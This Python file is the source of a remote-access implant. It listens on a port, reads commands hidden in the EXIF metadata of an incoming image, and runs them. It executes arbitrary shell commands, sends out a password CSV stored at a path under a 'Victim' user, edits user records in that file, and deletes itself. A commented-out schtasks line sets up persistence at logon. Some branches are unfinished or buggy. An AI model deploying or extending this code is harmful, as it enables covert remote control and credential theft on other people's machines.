import csv
import os
import ssl
import subprocess
import sys
from csv import writer
from socket import *

import pandas as pd
import piexif
from PIL import Image


def extract_custom_metadata(image_path):
    img = Image.open(image_path)
    exif_dict = piexif.load(img.info['exif'])
    metadata = exif_dict['Exif'][piexif.ExifIFD.MakerNote].decode()
    return metadata


def getCommand(connection_socket: socket):
    ######### TEMP START #########
    img = open("temp.png", "wb")
    incoming = connection_socket.recv(1024)
    while incoming[-2:] != b'\xff\xD9':
        img.write(incoming)
        incoming = connection_socket.recv(1024)
    img.write(incoming)
    img.close()
    command = extract_custom_metadata("temp.png")
    os.remove("temp.png")
    return command.split()
    ######### TEMP END #########


def obfuscateSend(msg: str, connection_socket: socket):  # TODO this at all
    ######### TEMP START #########
    connection_socket.send(msg.encode())
    ######### TEMP END #########


target = r"C:\Users\Victim\Downloads\userPasswords.csv"

# make the program persistant # TODO make this work
#cmd = f"schtasks /create /TR {sys.argv[0]} /SC ONLOGON /tn test" 
#os.system(cmd)

while True:
    implant_socket = socket(AF_INET, SOCK_STREAM)
    implant_socket.bind(("0.0.0.0", int(sys.argv[1])))
    implant_socket.listen()  
    connection_socket, client_address = implant_socket.accept()
    command = getCommand(connection_socket)
    print(command)

    if (command):
        obfuscateSend(f"COMMAND RECEIVED {command[0]}", connection_socket)

    if (command[0] == "RECON"):
        cmd = " ".join(command[1:])
        result = subprocess.check_output(cmd, shell=True)
        if result == b'':
            result = "empty STDOUT".encode()
        connection_socket.send(result)
    elif (command[0] == "SETPATH"):
        target = command[1]
    elif (command[0] == "DESTRUCT"):
        os.remove(sys.argv[0])
        connection_socket.send("SUCCESSFULLY REMOVED".encode())
        exit()
    elif (command[0] == "FETCHALL"):
        with open(f"{target}", "rb") as file:
            while True:
                bytes_read = file.read(1024)
                if not bytes_read:
                    break
                connection_socket.sendall(bytes_read)
            file.close()
    elif (command[0] == "ADDUSER"):
        with open(f"{target}", "r") as file:
            last_user_ID = file.readlines()[-1][0]
        new_user = [last_user_ID + 1, command[2], command[3]]
        with open(f"{target}", 'a') as file :
            write_obj = writer(file)
            write_obj.writerow(new_user)
            file.close()
    elif (command[0] == "REMOVEUSER"):
        df = pd.read_csv(f"{target}")
        df_s = df
        df_s = df_s.drop(df_s.query(f'USER_ID=={command[1]}').index)
        df_s.to_csv(f"{target}")

    elif (command[0] == "GETUSER"):
        connection_socket(df.loc[df['USER_ID'] == 'yellow'].encode())
    elif (command[0] == "SLEEP"):  # TODO make this do the Scheduler
        sys.argv[0].sleep(command[1])
